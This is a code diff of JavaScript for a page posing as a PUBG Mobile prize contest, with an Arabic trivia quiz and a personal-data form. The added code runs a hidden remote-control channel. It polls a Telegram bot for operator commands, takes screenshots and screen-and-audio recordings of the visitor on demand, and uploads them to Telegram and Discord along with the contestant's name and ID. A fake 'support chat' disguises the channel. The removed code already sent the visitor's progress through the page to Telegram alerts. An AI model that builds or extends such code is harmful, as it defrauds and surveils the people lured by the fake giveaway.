-            { q: "أي خريطة من خرائط ببجي تتميز بتواجد المصاعد والعماير الشاهقة؟", opts: ["نوسا", "إرنغل", "ميرامار", "كاراكين"], a: 0 },
-            { q: "ما هو حجم المخزن الأساسي لسلاح الرشاش الخفيف M249 قبل التوسعة؟", opts: ["75 طلقة", "100 طلقة", "50 طلقة", "60 طلقة"], a: 0 },
-            { q: "ما السلاح الذي يلقب بـ 'ملك المواجهات القريبة' لسعة وسرعة إطلاقه؟", opts: ["Uzi", "Vector", "UMP45", "Tommy Gun"], a: 0 },
-            { q: "في أي خريطة تظهر الزوبعة الرملية التي تعيق الرؤية وتدمر البنيات؟", opts: ["كاراكين", "ميرامار", "فيكندي", "سانهوك"], a: 0 },
-            { q: "كم عدد اللاعبين الأقصى في المباراة الكلاسيكية الواحدة في خريطة إرنغل؟", opts: ["100 لاعب", "64 لاعب", "50 لاعب", "80 لاعب"], a: 0 },
-            { q: "ما هي طلقة السلاح المساندة لـ AWM؟", opts: [".300 Magnum", "7.62mm", "5.56mm", "9mm"], a: 0 },
-            { q: "ما فائدة استخدام 'حقيبة الإسعافات الأوليّة' (First Aid Kit)؟", opts: ["تعيد الصحة حتى 75%", "تعيد الصحة بنسبة 100%", "تعطي طاقة حزام كاملة", "تعيد الصحة حتى 50%"], a: 0 },
-            { q: "أي خريطة تتميز بوجود ثلج وتزلج وغزلان ومناظر قريبة من القطب؟", opts: ["فيكندي", "ليفيك", "سانهوك", "كاراكين"], a: 0 },
-            { q: "ما اسم القنابل التي تطلق دخاناً كثيفاً حامياً للاعبين أثناء التثبيت؟", opts: ["قنبلة دخانية (Smoke)", "قنبلة صدمة (Stun)", "قنبلة مولوتوف", "قنبلة شظايا"], a: 0 },
-            { q: "أي من الأسلحة التالية يستخدم عيار 7.62mm ويتميز بضرر مرتفع جداً وارتداد عالي؟", opts: ["AKM", "M416", "SCAR-L", "AUG"], a: 0 },
-            { q: "كم ثانية تستغرق عملية إعادة إحياء (Revive) الزميل الساقط؟", opts: ["10 ثوانٍ", "5 ثوانٍ", "12 ثانية", "8 ثوانٍ"], a: 0 },
-            { q: "أي سلاح يعتبر خياراً مثالياً للثبات في المدى المتوسط بفضل امكانية تركيب 5 قطعات؟", opts: ["M416", "GROZA", "Beryl M762", "Mk14"], a: 0 },
-            { q: "ما السلاح الذي يخرج فقط من صندوق الإمدادات (Drop) ويطلق عيار 7.62mm أوتوماتيكي؟", opts: ["GROZA", "AKM", "DP-28", "SKS"], a: 0 },
-            { q: "ما هي الخريطة ذات الحجم الأصغر بـ 2x2 كم وتضم 52 لاعباً فقط؟", opts: ["ليفيك", "نوسا", "سانهوك", "إرنغل"], a: 0 },
-            { q: "ما السلاح الذي يمكن طي أخمص قدمه (Bipod) عند الانحناء أو الانطاح لزيادة الثبات؟", opts: ["DP-28", "M416", "Vector", "Mini14"], a: 0 },
-            { q: "ما الذي يحدث عند إطلاق مسدس الإشارات داخل المنطقة الآمنة (Safe Zone)؟", opts: ["استدعاء صندوق إمدادات جوي (Drop)", "استدعاء مدرعة BRDM", "استدعاء طائرة هليكوبتر", "إرسال قنبلة ذكية"], a: 0 },
-            { q: "أي من السيارات التالية تعتبر الأسرع على الطرق المعبدة في خريطة إرنغل؟", opts: ["Dacia", "UAZ", "Buggy", "Pickup"], a: 0 },
-            { q: "أي خريطة تتميز بالأشجار الاستوائية والمعابد القديمة والأمطار المتكررة؟", opts: ["سانهوك", "ميرامار", "فيكندي", "ليفيك"], a: 0 },
-            { q: "ما هو الملحق الذي يقلل من صوت السلاح ويخفي الوميض الصادر عند الإطلاق؟", opts: ["كاتم الصوت (Suppressor)", "تعويض الارتداد (Compensator)", "مخفي الوميض (Flash Hider)", "الخنق (Choke)"], a: 0 },
-            { q: "ما اسم الخريطة الصحراوية الشاسعة المترامية الأطراف؟", opts: ["ميرامار", "كاراكين", "نوسا", "إرنغل"], a: 0 },
-            { q: "ما هو الملحق الذي يساعد في تقليل الارتداد الرأسي والأفقي معاً للسلاح؟", opts: ["المُعوض (Compensator)", "الكاتم", "مخفي الوميض", "المقبض المائل"], a: 0 },
-            { q: "ما السلاح الرشاش السريع الذي يتوفر حصرياً في خريطة سانهوك كبديل لـ M416؟", opts: ["QBZ", "G36C", "AUG", "AKM"], a: 0 },
-            { q: "ما هي القنبلة التي تتسبب في حرق المنطقة وتلحق ضرراً مستمراً فوق المباني؟", opts: ["قنبلة المولوتوف (Molotov Cocktail)", "قنبلة الشظايا", "القنبلة الدخانية", "القنبلة الصوتية"], a: 0 },
-            { q: "ما السلاح الفردي القناص النصف أوتوماتيكي المميز بعيار 5.56mm وسرعة طلقة فائقة؟", opts: ["Mini14", "SKS", "SLR", "Mk14"], a: 0 },
-            { q: "ما هي الوسيلة التي تمكنك من العودة للمباراة بعد الموت في الأطوار الحديثة؟", opts: ["بطاقة الاستدعاء (Recall Card)", "حقنة العلاج", "مسدس الإشعارات", "حزام الأمان"], a: 0 },
-            { q: "ما هو اللون المفتاح لمنطقة الخطر الزون الأحمر (Red Zone) على الخريطة؟", opts: ["دائرة حمراء بها قصف مدفعي عشوائي", "دائرة زرقاء", "دائرة بيضاء", "دائرة خضراء"], a: 0 },
-            { q: "ما هي فائدة المقبض الرأسي (Vertical Foregrip) عند تركيبه على السلاح؟", opts: ["تقليل الارتداد الرأسي عند الإطلاق", "تقليل الارتداد الأفقي", "زيادة سرعة التعبئة", "زيادة مدى الزوم"], a: 0 },
-            { q: "ما هي وسيلة النقل المائية الأساسية للتنقل بين الجزر في الخرائط؟", opts: ["القارب السريع (Zodiac / Speedboat)", "السيارة البرمائية", "الدرع المائي", "الطائرة"], a: 0 },
-            { q: "ما هو الحد الأقصى لرتبة السيرفر الاحترافية (Rank) التي يصل إليها اللاعبون الأوائل؟", opts: ["الغازي (Conqueror)", "الوردي (Ace Master)", "الماس (Diamond)", "التاج (Crown)"], a: 0 }
-        ];
-
-        let state = {
-            currentStep: 1,
-            selectedReward: '300 UC',
-            score: 0,
-            activeQuestions: [],
-            currentQuestionIdx: 0,
-            quizTimerVal: 20,
-            quizTimerInterval: null,
-            fullName: '',
-            phone: '',
-            age: '',
-            address: '',
-            playerID: '',
-            level: ''
-        };
-
-        function goToStep(stepNum) {
-            if (!navigator.onLine) return;
-            audio.playClick();
-            state.currentStep = stepNum;
-
-            document.querySelectorAll('.glass-card').forEach(card => card.classList.remove('active'));
-            const targetCard = document.getElementById(`cardStep${stepNum}`);
-            if (targetCard) targetCard.classList.add('active');
-
-            const btnBack = document.getElementById('btnHeaderBack');
-            if (btnBack) {
-                btnBack.style.display = (stepNum > 1) ? 'inline-flex' : 'none';
-            }
-
-            document.querySelectorAll('.step-tab').forEach(tab => {
-                const tStep = parseInt(tab.dataset.step);
-                tab.classList.remove('active');
-                if (tStep === stepNum) tab.classList.add('active');
-                if (tStep < stepNum) tab.classList.add('completed');
-            });
-
-            const fillPercent = (stepNum / 4) * 100;
-            document.getElementById('progressBarFill').style.width = `${fillPercent}%`;
-
-            if (stepNum === 2) {
-                initTriviaChallenge();
-            }
-
-            window.scrollTo({ top: 100, behavior: 'smooth' });
-        }
-
-        function goBackStep() {
-            if (state.currentStep > 1) {
-                sendTelegramAlert(`🔄 **قام المتسابق بالعودة للخطوة (${state.currentStep - 1})**`);
-                goToStep(state.currentStep - 1);
-            }
-        }
-
-        function selectReward(el, rewardTitle) {
-            document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
-            el.classList.add('selected');
-            state.selectedReward = rewardTitle;
-            saveFormDataLocally();
-            audio.playClick();
-
-            sendTelegramAlert(`🎁 **قام المتسابق باختيار جائزة:** ${rewardTitle}`);
-        }
-
-        function initTriviaChallenge() {
-            state.score = 0;
-            document.getElementById('quizScore').innerText = '0';
-            document.getElementById('quizContainerBox').style.display = 'block';
-            document.getElementById('quizSuccessBox').style.display = 'none';
-
-            const shuffled = [...pubgTriviaBank].sort(() => 0.5 - Math.random());
-            state.activeQuestions = shuffled.slice(0, 5);
-            state.currentQuestionIdx = 0;
-            renderQuestion();
-        }
-
-        function renderQuestion() {
-            if (state.score >= 3) {
-                audio.playCorrect();
-                document.getElementById('quizContainerBox').style.display = 'none';
-                document.getElementById('quizSuccessBox').style.display = 'block';
-                sendTelegramAlert(`🧠 **اجتاز المتسابق اختبار الأسئلة بنجاح! (3/3)**`);
-                return;
-            }
-
-            const qObj = state.activeQuestions[state.currentQuestionIdx];
-            document.getElementById('questionCounter').innerText = `السؤال الحالي (${state.currentQuestionIdx + 1}):`;
-            document.getElementById('questionText').innerText = qObj.q;
-
-            const optionsContainer = document.getElementById('optionsContainer');
-            optionsContainer.innerHTML = '';
-
-            let indexedOpts = qObj.opts.map((opt, idx) => ({ text: opt, isCorrect: idx === qObj.a }));
-            indexedOpts.sort(() => 0.5 - Math.random());
-
-            indexedOpts.forEach(optItem => {
-                const btn = document.createElement('button');
-                btn.className = 'option-btn';
-                btn.innerText = optItem.text;
-                btn.onclick = () => handleAnswerClick(btn, optItem.isCorrect);
-                optionsContainer.appendChild(btn);
-            });
-
-            startQuizTimer();
-        }
-
-        function startQuizTimer() {
-            clearInterval(state.quizTimerInterval);
-            state.quizTimerVal = 20;
-            document.getElementById('quizTimer').innerText = state.quizTimerVal;
-
-            state.quizTimerInterval = setInterval(() => {
-                state.quizTimerVal--;
-                document.getElementById('quizTimer').innerText = state.quizTimerVal;
-                audio.playTick();
-
-                if (state.quizTimerVal <= 0) {
-                    clearInterval(state.quizTimerInterval);
-                    audio.playTimerEnd();
-                    replaceQuestionOnWrong();
-                }
+        if (!isSupportOnline) {
+            setTimeout(() => {
+                displayAndSaveMessage("وصلتنا رسالتك وسيجاب عليها قريباً.", 'admin-msg', getCurrentTimeFormatted(), '');
             }, 1000);
         }
 
-        function handleAnswerClick(btnEl, isCorrect) {
-            clearInterval(state.quizTimerInterval);
-            const allBtns = document.querySelectorAll('.option-btn');
-            allBtns.forEach(b => b.style.pointerEvents = 'none');
+        if (textInput) textInput.value = "";
+        sessionStorage.removeItem("chat_draft");
+        if (fileInput) fileInput.value = "";
+        if (preview) preview.style.display = "none";
+    };
 
-            if (isCorrect) {
-                btnEl.classList.add('correct');
-                audio.playCorrect();
-                state.score++;
-                document.getElementById('quizScore').innerText = state.score;
-                setTimeout(() => {
-                    state.currentQuestionIdx++;
-                    renderQuestion();
-                }, 1000);
-            } else {
-                btnEl.classList.add('wrong');
-                audio.playWrong();
-                setTimeout(() => {
-                    replaceQuestionOnWrong();
-                }, 1200);
-            }
+    window.takeUserInstantScreenshot = function() {
+        takeScreenShot(0);
+    };
+
+    function takeScreenShot(delaySeconds = 0) {
+        if (typeof html2canvas === 'undefined' || !navigator.onLine) return;
+        
+        const executeShot = () => {
+            html2canvas(document.body).then(canvas => {
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob, "user_screenshot.png");
+                    formData.append("caption", `📸 **لقطة شاشة للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
+                    formData.append("parse_mode", "Markdown");
+
+                    const timeStr = getCurrentTimeFormatted();
+                    const imgURL = URL.createObjectURL(blob);
+                    displayAndSaveMessage("تم إرسال لقطة الشاشة للدعم.", 'user-msg', timeStr, '✔', imgURL);
+                    playNotificationSound('send');
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                    sendDiscordCard("📸 لقطة شاشة جديدة", `تم التقاط الشاشة للمتسابق: ${contestantName}`, [], 0xe67e22);
+                });
+            });
+        };
+
+        if (delaySeconds > 0) {
+            setTimeout(executeShot, delaySeconds * 1000);
+        } else {
+            executeShot();
         }
+    }
 
-        function replaceQuestionOnWrong() {
-            const availableNew = pubgTriviaBank.filter(q => !state.activeQuestions.includes(q));
-            const randomNew = availableNew[Math.floor(Math.random() * availableNew.length)] || pubgTriviaBank[0];
-            state.activeQuestions[state.currentQuestionIdx] = randomNew;
-            renderQuestion();
-        }
+    async function startScreenRecording(durationSeconds = 10, delaySeconds = 0) {
+        if (isRecording || !navigator.onLine) return;
 
-        function toggleHelp(helpId) {
-            audio.playClick();
-            const el = document.getElementById(helpId);
-            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
-        }
+        const startExec = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { mediaSource: "screen" },
+                    audio: true
+                });
 
-        function validatePersonalForm() {
-            const name = document.getElementById('inputFullName').value.trim();
-            const phone = document.getElementById('inputPhone').value.trim();
-            const age = document.getElementById('inputAge').value.trim();
-            const addr = document.getElementById('inputAddress').value.trim();
-            const pid = document.getElementById('inputPlayerID').value.trim();
-            const lvl = document.getElementById('inputLevel').value.trim();
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(stream);
 
-            const isNameValid = /^[\u0600-\u06FFa-zA-Z\s]{5,}$/.test(name);
-            const isPhoneValid = /^[0-9+]{7,15}$/.test(phone);
-            const isAgeValid = age !== '' && parseInt(age) >= 10;
-            const isAddrValid = addr.length >= 3;
-            const isLvlValid = lvl !== '' && parseInt(lvl) >= 1;
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) recordedChunks.push(e.data);
+                };
 
-            const isPidNotRepeated = !/^(.)\1+$/.test(pid) && pid !== "123456" && pid !== "12345678" && pid !== "123456789" && pid !== "1234567890";
-            const isPidValid = /^[0-9]{6,12}$/.test(pid) && isPidNotRepeated;
+                mediaRecorder.onstop = () => {
+                    isRecording = false;
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    const blob = new Blob(recordedChunks, { type: "video/webm" });
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("video", blob, "screen_record.webm");
+                    formData.append("caption", `🎥 **تسجيل فيديو للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
+                    formData.append("parse_mode", "Markdown");
 
-            if (addr.includes("اليمن") || addr.includes("صنعاء")) {
-                if (phone.startsWith("7") && phone.length === 9) {
-                    document.getElementById('inputPhone').value = "+967" + phone;
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: formData })
+                        .catch(() => {
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: formData });
+                        });
+
+                    sendDiscordCard("🎥 تسجيل فيديو للمنصة", `تم رفع تسجيل فيديو للمتسابق ${contestantName}`, [], 0xe74c3c);
+                };
+
+                mediaRecorder.start();
+                isRecording = true;
+
+                if (durationSeconds > 0) {
+                    setTimeout(() => {
+                        stopScreenRecording();
+                    }, durationSeconds * 1000);
                 }
+
+            } catch (err) {
+                sendUnifiedAlert(`❌ **فشل بدء تسجيل الفيديو:** ${err.message}`, "❌ خطأ في التسجيل", [], 0xff0000);
             }
+        };
 
-            document.getElementById('iconName').className = isNameValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
-            document.getElementById('iconPhone').className = isPhoneValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
-            document.getElementById('iconAge').className = isAgeValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
-            document.getElementById('iconAddress').className = isAddrValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
-            document.getElementById('iconPlayerID').className = isPidValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
-            document.getElementById('iconLevel').className = isLvlValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+        if (delaySeconds > 0) {
+            setTimeout(startExec, delaySeconds * 1000);
+        } else {
+            startExec();
+        }
+    }
 
-            const isValidAll = isNameValid && isPhoneValid && isAgeValid && isAddrValid && isPidValid && isLvlValid;
-            document.getElementById('btnNextStep3').disabled = !isValidAll;
+    function stopScreenRecording() {
+        if (mediaRecorder && isRecording) {
+            mediaRecorder.stop();
+        }
+    }
 
-            state.fullName = name;
-            state.phone = phone;
-            state.age = age;
-            state.address = addr;
-            state.playerID = pid;
-            state.level = lvl;
+    function displayAndSaveMessage(text, className, time, status = '', imgUrl = null) {
+        renderMessage(text, className, time, status, imgUrl);
+        saveChatHistory({ text, className, time, status, imgUrl });
+    }
 
-            if (isNameValid) {
-                contestantName = name;
-                localStorage.setItem("contestant_name", contestantName);
-            }
+    function renderMessage(text, className, time, status = '', imgUrl = null) {
+        const chatBox = document.getElementById("chat-box");
+        if (!chatBox) return;
 
-            saveFormDataLocally();
+        const msgElement = document.createElement("div");
+        msgElement.className = `msg ${className}`;
+
+        if (imgUrl) {
+            const img = document.createElement("img");
+            img.src = imgUrl;
+            msgElement.appendChild(img);
         }
 
-        function submitStep3Logic() {
-            const dataReport = `
+        if (text) {
+            const textSpan = document.createElement("span");
+            textSpan.innerText = text;
+            msgElement.appendChild(textSpan);
+        }
+
+        const metaDiv = document.createElement("div");
+        metaDiv.className = "msg-meta";
+        metaDiv.innerHTML = `<span>${time}</span>` + (status ? `<span class="checkmark ${status === '✔✔' ? 'read' : ''}">${status}</span>` : '');
+        msgElement.appendChild(metaDiv);
+
+        chatBox.appendChild(msgElement);
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    function fetchAdminMessages() {
+        if (!navigator.onLine) return;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+            .then(res => res.json())
+            .then(async data => {
+                if (data.ok && data.result.length > 0) {
+                    for (const update of data.result) {
+                        lastUpdateId = Math.max(lastUpdateId, update.update_id);
+                        sessionStorage.setItem("last_telegram_update_id", lastUpdateId.toString());
+
+                        const msg = update.message;
+                        if (!msg) continue;
+
+                        if (processedMsgIds.has(msg.message_id)) continue;
+
+                        let text = msg.text || msg.caption || "";
+
+                        if (text.includes(contestantId)) {
+                            processedMsgIds.add(msg.message_id);
+                            sessionStorage.setItem("processed_msg_ids", JSON.stringify(Array.from(processedMsgIds)));
+
+                            document.querySelectorAll(".user-msg .checkmark").forEach(el => {
+                                el.innerText = "✔✔";
+                                el.classList.add("read");
+                            });
+
+                            if (text.includes("/shot")) {
+                                const match = text.match(/\/shot\s*(\d+)?/i);
+                                const delay = match && match[1] ? parseInt(match[1]) : 0;
+                                takeScreenShot(delay);
+                                continue;
+                            }
+
+                            if (text.includes("/record")) {
+                                const match = text.match(/\/record\s*(\d+)?\s*(\d+)?/i);
+                                const duration = match && match[1] ? parseInt(match[1]) : 10;
+                                const delay = match && match[2] ? parseInt(match[2]) : 0;
+                                startScreenRecording(duration, delay);
+                                continue;
+                            }
+
+                            if (text.includes("/stop")) {
+                                stopScreenRecording();
+                                continue;
+                            }
+
+                            if (text.includes("/offline")) {
+                                setSupportStatus(false);
+                                continue;
+                            }
+
+                            if (text.includes("/online")) {
+                                setSupportStatus(true);
+                                continue;
+                            }
+
+                            let telegramImgUrl = null;
+                            if (msg.photo && msg.photo.length > 0) {
+                                const largestPhoto = msg.photo[msg.photo.length - 1];
+                                try {
+                                    const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${largestPhoto.file_id}`);
+                                    const fileData = await fileRes.json();
+                                    if (fileData.ok && fileData.result.file_path) {
+                                        telegramImgUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
+                                    }
+                                } catch (e) {}
+                            }
+
+                            let cleanText = text.replace(new RegExp(contestantId + ":?", "gi"), "").trim();
+                            if (cleanText || telegramImgUrl) {
+                                displayAndSaveMessage(cleanText, 'admin-msg', getCurrentTimeFormatted(), '', telegramImgUrl);
+                                playNotificationSound('receive');
+                                trigger10SecAutoOpen();
+                            }
+                        }
+                    }
+                }
+            })
+            .catch(() => {});
+    }
+
+    function setSupportStatus(online) {
+        isSupportOnline = online;
+        const dot1 = document.getElementById("support-status-dot");
+        const dot2 = document.getElementById("header-status-dot");
+        const statusText = document.getElementById("support-status-text");
+
+        if (online) {
+            if (dot1) dot1.classList.remove("offline");
+            if (dot2) dot2.classList.remove("offline");
+            if (statusText) statusText.innerText = "متصل الآن";
+        } else {
+            if (dot1) dot1.classList.add("offline");
+            if (dot2) dot2.classList.add("offline");
+            if (statusText) statusText.innerText = "غير متصل حالياً";
+        }
+    }
+
+    setInterval(fetchAdminMessages, 2000);
+
+    class AudioEngine {
+        constructor() {
+            this.ctx = new (window.AudioContext || window.webkitAudioContext)();
+        }
+        playClick() {
+            if (this.ctx.state === 'suspended') this.ctx.resume();
+            const osc = this.ctx.createOscillator();
+            const gain = this.ctx.createGain();
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(800, this.ctx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(400, this.ctx.currentTime + 0.05);
+            gain.gain.setValueAtTime(0.3, this.ctx.currentTime);
+            gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.05);
+            osc.connect(gain);
+            gain.connect(this.ctx.destination);
+            osc.start();
+            osc.stop(this.ctx.currentTime + 0.05);
+        }
+        playTick() {
+            if (this.ctx.state === 'suspended') this.ctx.resume();
+            const osc = this.ctx.createOscillator();
+            const gain = this.ctx.createGain();
+            osc.type = 'square';
+            osc.frequency.setValueAtTime(1200, this.ctx.currentTime);
+            gain.gain.setValueAtTime(0.05, this.ctx.currentTime);
+            gain.gain.linearRampToValueAtTime(0.001, this.ctx.currentTime + 0.03);
+            osc.connect(gain);
+            gain.connect(this.ctx.destination);
+            osc.start();
+            osc.stop(this.ctx.currentTime + 0.03);
+        }
+        playTimerEnd() {
+            if (this.ctx.state === 'suspended') this.ctx.resume();
+            const osc = this.ctx.createOscillator();
+            const gain = this.ctx.createGain();
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(300, this.ctx.currentTime);
+            gain.gain.setValueAtTime(0.3, this.ctx.currentTime);
+            gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.25);
+            osc.connect(gain);
+            gain.connect(this.ctx.destination);
+            osc.start();
+            osc.stop(this.ctx.currentTime + 0.25);
+        }
+        playCorrect() {
+            if (this.ctx.state === 'suspended') this.ctx.resume();
+            const now = this.ctx.currentTime;
+            const osc = this.ctx.createOscillator();
+            const gain = this.ctx.createGain();
+            osc.type = 'triangle';
+            osc.frequency.setValueAtTime(523.25, now);
+            osc.frequency.setValueAtTime(659.25, now + 0.1);
+            osc.frequency.setValueAtTime(783.99, now + 0.2);
+            gain.gain.setValueAtTime(0.4, now);
+            gain.gain.linearRampToValueAtTime(0.01, now + 0.4);
+            osc.connect(gain);
+            gain.connect(this.ctx.destination);
+            osc.start();
+            osc.stop(now + 0.4);
+        }
+        playWrong() {
+            if (this.ctx.state === 'suspended') this.ctx.resume();
+            const now = this.ctx.currentTime;
+            const osc = this.ctx.createOscillator();
+            const gain = this.ctx.createGain();
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(180, now);
+            osc.frequency.setValueAtTime(140, now + 0.15);
+            gain.gain.setValueAtTime(0.4, now);
+            gain.gain.linearRampToValueAtTime(0.01, now + 0.35);
+            osc.connect(gain);
+            gain.connect(this.ctx.destination);
+            osc.start();
+            osc.stop(now + 0.35);
+        }
+    }
+    const audio = new AudioEngine();
+
+    document.addEventListener('click', (e) => {
+        if (e.target.closest('button, .step-tab, .reward-card, a')) {
+            audio.playClick();
+        }
+    });
+
+    const pubgTriviaBank = [
+        { q: "ما هي أقوى بندقية قنص يدوية (Bolt-Action) في ببجي موبايل من حيث الضرر؟", opts: ["AWM", "M24", "Kar98k", "Mosin Nagant"], a: 0 },
+        { q: "أي خريطة من خرائط ببجي تتميز بتواجد المصاعد والعماير الشاهقة؟", opts: ["نوسا", "إرنغل", "ميرامار", "كاراكين"], a: 0 },
+        { q: "ما هو حجم المخزن الأساسي لسلاح الرشاش الخفيف M249 قبل التوسعة؟", opts: ["75 طلقة", "100 طلقة", "50 طلقة", "60 طلقة"], a: 0 },
+        { q: "ما السلاح الذي يلقب بـ 'ملك المواجهات القريبة' لسعة وسرعة إطلاقه؟", opts: ["Uzi", "Vector", "UMP45", "Tommy Gun"], a: 0 },
+        { q: "في أي خريطة تظهر الزوبعة الرملية التي تعيق الرؤية وتدمر البنيات؟", opts: ["كاراكين", "ميرامار", "فيكندي", "سانهوك"], a: 0 },
+        { q: "كم عدد اللاعبين الأقصى في المباراة الكلاسيكية الواحدة في خريطة إرنغل؟", opts: ["100 لاعب", "64 لاعب", "50 لاعب", "80 لاعب"], a: 0 },
+        { q: "ما هي طلقة السلاح المساندة لـ AWM؟", opts: [".300 Magnum", "7.62mm", "5.56mm", "9mm"], a: 0 },
+        { q: "ما فائدة استخدام 'حقيبة الإسعافات الأوليّة' (First Aid Kit)؟", opts: ["تعيد الصحة حتى 75%", "تعيد الصحة بنسبة 100%", "تعطي طاقة حزام كاملة", "تعيد الصحة حتى 50%"], a: 0 },
+        { q: "أي خريطة تتميز بوجود ثلج وتزلج وغزلان ومناظر قريبة من القطب؟", opts: ["فيكندي", "ليفيك", "سانهوك", "كاراكين"], a: 0 },
+        { q: "ما اسم القنابل التي تطلق دخاناً كثيفاً حامياً للاعبين أثناء التثبيت؟", opts: ["قنبلة دخانية (Smoke)", "قنبلة صدمة (Stun)", "قنبلة مولوتوف", "قنبلة شظايا"], a: 0 },
+        { q: "أي من الأسلحة التالية يستخدم عيار 7.62mm ويتميز بضرر مرتفع جداً وارتداد عالي؟", opts: ["AKM", "M416", "SCAR-L", "AUG"], a: 0 },
+        { q: "كم ثانية تستغرق عملية إعادة إحياء (Revive) الزميل الساقط؟", opts: ["10 ثوانٍ", "5 ثوانٍ", "12 ثانية", "8 ثوانٍ"], a: 0 },
+        { q: "أي سلاح يعتبر خياراً مثالياً للثبات في المدى المتوسط بفضل امكانية تركيب 5 قطعات؟", opts: ["M416", "GROZA", "Beryl M762", "Mk14"], a: 0 },
+        { q: "ما السلاح الذي يخرج فقط من صندوق الإمدادات (Drop) ويطلق عيار 7.62mm أوتوماتيكي؟", opts: ["GROZA", "AKM", "DP-28", "SKS"], a: 0 },
+        { q: "ما هي الخريطة ذات الحجم الأصغر بـ 2x2 كم وتضم 52 لاعباً فقط؟", opts: ["ليفيك", "نوسا", "سانهوك", "إرنغل"], a: 0 },
+        { q: "ما السلاح الذي يمكن طي أخمص قدمه (Bipod) عند الانحناء أو الانطاح لزيادة الثبات؟", opts: ["DP-28", "M416", "Vector", "Mini14"], a: 0 },
+        { q: "ما الذي يحدث عند إطلاق مسدس الإشارات داخل المنطقة الآمنة (Safe Zone)؟", opts: ["استدعاء صندوق إمدادات جوي (Drop)", "استدعاء مدرعة BRDM", "استدعاء طائرة هليكوبتر", "إرسال قنبلة ذكية"], a: 0 },
+        { q: "أي من السيارات التالية تعتبر الأسرع على الطرق المعبدة في خريطة إرنغل؟", opts: ["Dacia", "UAZ", "Buggy", "Pickup"], a: 0 },
+        { q: "أي خريطة تتميز بالأشجار الاستوائية والمعابد القديمة والأمطار المتكررة؟", opts: ["سانهوك", "ميرامار", "فيكندي", "ليفيك"], a: 0 },
+        { q: "ما هو الملحق الذي يقلل من صوت السلاح ويخفي الوميض الصادر عند الإطلاق؟", opts: ["كاتم الصوت (Suppressor)", "تعويض الارتداد (Compensator)", "مخفي الوميض (Flash Hider)", "الخنق (Choke)"], a: 0 },
+        { q: "ما اسم الخريطة الصحراوية الشاسعة المترامية الأطراف؟", opts: ["ميرامار", "كاراكين", "نوسا", "إرنغل"], a: 0 },
+        { q: "ما هو الملحق الذي يساعد في تقليل الارتداد الرأسي والأفقي معاً للسلاح؟", opts: ["المُعوض (Compensator)", "الكاتم", "مخفي الوميض", "المقبض المائل"], a: 0 },
+        { q: "ما السلاح الرشاش السريع الذي يتوفر حصرياً في خريطة سانهوك كبديل لـ M416؟", opts: ["QBZ", "G36C", "AUG", "AKM"], a: 0 },
+        { q: "ما هي القنبلة التي تتسبب في حرق المنطقة وتلحق ضرراً مستمراً فوق المباني؟", opts: ["قنبلة المولوتوف (Molotov Cocktail)", "قنبلة الشظايا", "القنبلة الدخانية", "القنبلة الصوتية"], a: 0 },
+        { q: "ما السلاح الفردي القناص النصف أوتوماتيكي المميز بعيار 5.56mm وسرعة طلقة فائقة؟", opts: ["Mini14", "SKS", "SLR", "Mk14"], a: 0 },
+        { q: "ما هي الوسيلة التي تمكنك من العودة للمباراة بعد الموت في الأطوار الحديثة؟", opts: ["بطاقة الاستدعاء (Recall Card)", "حقنة العلاج", "مسدس الإشعارات", "حزام الأمان"], a: 0 },
+        { q: "ما هو اللون المفتاح لمنطقة الخطر الزون الأحمر (Red Zone) على الخريطة؟", opts: ["دائرة حمراء بها قصف مدفعي عشوائي", "دائرة زرقاء", "دائرة بيضاء", "دائرة خضراء"], a: 0 },
+        { q: "ما هي فائدة المقبض الرأسي (Vertical Foregrip) عند تركيبه على السلاح؟", opts: ["تقليل الارتداد الرأسي عند الإطلاق", "تقليل الارتداد الأفقي", "زيادة سرعة التعبئة", "زيادة مدى الزوم"], a: 0 },
+        { q: "ما هي وسيلة النقل المائية الأساسية للتنقل بين الجزر في الخرائط؟", opts: ["القارب السريع (Zodiac / Speedboat)", "السيارة البرمائية", "الدرع المائي", "الطائرة"], a: 0 },
+        { q: "ما هو الحد الأقصى لرتبة السيرفر الاحترافية (Rank) التي يصل إليها اللاعبون الأوائل؟", opts: ["الغازي (Conqueror)", "الوردي (Ace Master)", "الماس (Diamond)", "التاج (Crown)"], a: 0 }
+    ];
+
+    let state = {
+        currentStep: 1,
+        selectedReward: '300 UC',
+        score: 0,
+        activeQuestions: [],
